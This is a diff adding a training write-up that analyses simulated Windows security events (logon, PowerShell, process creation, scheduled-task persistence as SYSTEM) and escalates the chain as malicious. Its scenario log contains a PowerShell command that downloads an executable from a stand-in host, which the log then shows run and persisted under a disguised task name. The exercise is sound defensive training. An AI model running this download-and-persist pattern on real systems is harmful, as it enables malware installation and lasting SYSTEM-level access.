@@ -1,0 +1,209 @@
+# Mission 30 — Threat Hunting Final Analyst Challenge
+
+## 🎯 Objective
+
+Apply the threat-hunting skills developed throughout Week 8 by analyzing a correlated sequence of Windows security events and determining whether the activity should be considered benign, suspicious, or malicious.
+
+The investigation focused on:
+
+* Authentication activity
+* PowerShell execution
+* Process creation
+* Executable execution
+* Scheduled-task persistence
+* SYSTEM-level execution
+* Behavioral correlation
+* Escalation decisions
+
+---
+
+## 🔎 Scenario
+
+The following activity was observed on a Windows workstation:
+
+```text
+8:14:02 AM — Event ID 4624
+User: jsmith
+Logon Type: 2
+Source: 127.0.0.1
+
+8:15:11 AM — Event ID 4688
+New Process:
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+
+8:15:14 AM — PowerShell Event ID 4104
+Script:
+Invoke-WebRequest https://updates-example.com/tool.exe -OutFile C:\Users\Public\tool.exe
+
+8:15:19 AM — Event ID 4688
+New Process:
+C:\Users\Public\tool.exe
+
+8:15:27 AM — Event ID 4698
+A scheduled task was created
+
+Task Name:
+WindowsUpdateCheck
+
+Action:
+C:\Users\Public\tool.exe
+
+Run As:
+SYSTEM
+
+8:15:31 AM — Event ID 4688
+New Process:
+C:\Users\Public\tool.exe
+```
+
+---
+
+# 🧠 Analyst Assessment
+
+## 1. Classification
+
+### 🔴 Malicious / Highly Suspicious
+
+The activity was classified as malicious for the purpose of this exercise because the sequence demonstrates multiple behaviors commonly associated with payload execution and persistence.
+
+---
+
+## 2. Behavioral Chain
+
+The strongest evidence was the correlation of the events:
+
+```text
+User Login
+    ↓
+PowerShell Execution
+    ↓
+Downloads External Executable
+    ↓
+Executable Created in C:\Users\Public\
+    ↓
+Executable Executes
+    ↓
+Scheduled Task Created
+    ↓
+Task Configured to Run as SYSTEM
+    ↓
+Executable Executes Again
+```
+
+The sequence is more significant than any individual event.
+
+PowerShell itself is not inherently malicious, and a user login is normal activity. However, downloading and executing an external executable followed immediately by creation of a SYSTEM-level scheduled task represents a highly suspicious execution and persistence chain.
+
+---
+
+# 🔬 Evidence Selected for Further Investigation
+
+The three highest-priority evidence sources selected were:
+
+### 1. PowerShell Script
+
+Review the complete Event ID 4104 script block to determine:
+
+* What was downloaded
+* Where it came from
+* Why it was downloaded
+* Whether additional commands were executed
+* Whether obfuscation or encoded content was used
+
+### 2. Scheduled Task Details
+
+Investigate:
+
+* Task name
+* Creation time
+* Action/command
+* Trigger
+* Run-as account
+* Task XML
+* Persistence behavior
+
+The fact that the task runs as **SYSTEM** significantly increases the severity of the event chain.
+
+### 3. Digital Signature / File Hash
+
+Analyze the downloaded executable for:
+
+* SHA-256 hash
+* Digital signature
+* Certificate issuer
+* File metadata
+* File reputation
+* Creation and modification timestamps
+
+Additional investigation should also include the external domain and destination IP associated with the download.
+
+---
+
+# 🚨 Escalation Decision
+
+### ✅ Escalate: YES
+
+The activity should be escalated for further investigation because multiple high-risk behaviors occurred within approximately 30 seconds:
+
+```text
+PowerShell
+→ External Download
+→ Executable Execution
+→ Persistence
+→ SYSTEM Execution
+```
+
+This pattern is sufficiently suspicious to warrant escalation even before the downloaded executable has been conclusively identified as malware.
+
+---
+
+# 🧠 Analyst Reasoning
+
+This exercise reinforced the importance of **behavioral correlation**.
+
+Individual events can appear legitimate:
+
+* User login → Normal
+* PowerShell → Potentially normal
+* Web request → Potentially normal
+* Scheduled task → Potentially normal
+
+However, the relationship between those events can reveal a much more concerning pattern.
+
+Threat hunters should therefore evaluate:
+
+> **What happened before the event, what happened after it, and how the events relate to one another?**
+
+---
+
+# 📚 Lessons Learned
+
+1. A successful login does not make all subsequent activity legitimate.
+
+2. PowerShell execution alone should not automatically be classified as malicious.
+
+3. External executable downloads require contextual investigation.
+
+4. Scheduled tasks can be used for legitimate administration or malicious persistence.
+
+5. SYSTEM-level execution significantly increases the risk associated with newly created persistence.
+
+6. Behavioral correlation is more valuable than relying on isolated indicators.
+
+7. Analysts should distinguish between confirmed facts and assessments based on available evidence.
+
+8. Highly suspicious behavior can justify escalation even when malware has not yet been confirmed.
+
+---
+
+# 🎯 Final Conclusion
+
+The observed activity represents a **highly suspicious execution and persistence chain** involving PowerShell, an externally downloaded executable, and a newly created scheduled task configured to run as SYSTEM.
+
+The investigation should therefore be **escalated for further analysis and potential containment**.
+
+The key lesson from this challenge is that effective threat hunting depends on connecting individual security events into a coherent timeline and evaluating the behavior as a whole.
+
+**Final Assessment: 🔴 Malicious / Highly Suspicious**
+
+**Escalation: ✅ Yes**
